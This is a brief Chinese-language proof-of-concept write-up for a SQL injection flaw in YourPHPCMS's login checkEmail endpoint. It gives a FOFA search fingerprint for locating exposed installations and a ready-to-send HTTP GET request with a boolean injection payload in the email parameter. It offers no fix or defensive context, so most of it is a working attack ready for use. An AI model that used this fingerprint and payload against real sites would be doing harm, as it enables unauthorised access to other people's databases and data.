# YourPHPCMS系统login_checkEmail存在sql注入漏洞
YourPHPCMS login_checkEmail存在sql注入漏洞

## fofa
```rust
header="YP_onlineid"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732274946081-2fa7b36f-5b27-464c-899e-b80b63981e17.png)

## poc
```rust
GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732274927301-ad8d704f-9b24-4757-a70a-01095646ed2a.png)

